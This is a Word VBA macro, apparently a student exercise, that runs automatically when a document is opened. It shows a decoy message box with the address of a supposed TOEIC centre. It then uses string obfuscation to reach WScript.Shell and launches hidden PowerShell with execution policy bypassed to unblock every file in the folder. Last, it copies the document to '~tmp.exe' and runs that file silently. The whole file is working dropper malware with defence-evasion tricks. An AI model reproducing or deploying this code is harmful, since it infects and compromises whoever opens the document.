Sub AutoOpen()
    Dim message As String
    Dim title As String
    
    message = "Trung tam Toeic ABX" & vbCrLf
    message = message & "Duong so 5, Phuong nt230, Quan UIT" & vbCrLf
    title = "Thong tin"
    MsgBox message,, title
    
    ExecuteCleanup
    
    Dim fso As Object
    Dim sourcePath As String
    Dim targetPath As String
    Dim shell As Object
    
    Dim fsoStr As String
    fsoStr = DecodeString("Tdsjqujoh/GjmfTztufnPckfdu") ' Scripting.FileSystemObject
    
    Dim shellStr As String
    shellStr = DecodeString("XTdsjqu/Tifmm") ' WScript.Shell
    
    Set fso = CreateObject(fsoStr)
    Set shell = CreateObject(shellStr)
    sourcePath = ActiveDocument.Path & "\BT6.docm"
    targetPath = ActiveDocument.Path & "\~tmp.exe" 
        
    If fso.FileExists(targetPath) Then
        fso.DeleteFile targetPath
    End If
    fso.CopyFile sourcePath, targetPath
    
    Dim startTime As Double
    startTime = Timer
    Do While Timer < startTime + 5
        DoEvents
    Loop
    shell.Run Chr(34) & targetPath & Chr(34), 0, False
    Set fso = Nothing
    Set shell = Nothing
End Sub

Function DecodeString(encoded As String) As String
    Dim result As String
    result = ""
    For i = 1 To Len(encoded)
        result = result & Chr(Asc(Mid(encoded, i, 1)) - 1)
    Next i
    DecodeString = result
End Function

Sub ExecuteCleanup()
    On Error Resume Next
    Dim obj As Object
    Dim cmd As String
    Dim path As String
    Dim temp1 As String
    Dim temp2 As String
    Dim temp3 As String
    Dim fullCmd As String
    
    temp1 = DecodeString("qpxfstifmm/fyf") ' powershell.exe
    temp2 = DecodeString("Hfu.DijmeJufn") ' Get-ChildItem
    temp3 = DecodeString("Vocmpdl.Gjmf") ' Unblock-File
    
    path = ActiveDocument.Path
    
    Dim startDelay As Double
    startDelay = Timer
    Do While Timer < startDelay + 2
        DoEvents
    Loop
    
    cmd = temp2 & " -Path '" & path & "' -Recurse | " & temp3
    fullCmd = temp1 & " -WindowStyle Hidden -ExecutionPolicy Bypass -Command """ & cmd & """"
    
    Set obj = CreateObject(DecodeString("XTdsjqu/Tifmm")) ' WScript.Shell
    obj.Run fullCmd, 0, False
    
    Dim waitTime As Double
    waitTime = Timer
    Do While Timer < waitTime + 1
        DoEvents
    Loop
    
    Set obj = Nothing
    On Error GoTo 0
End Sub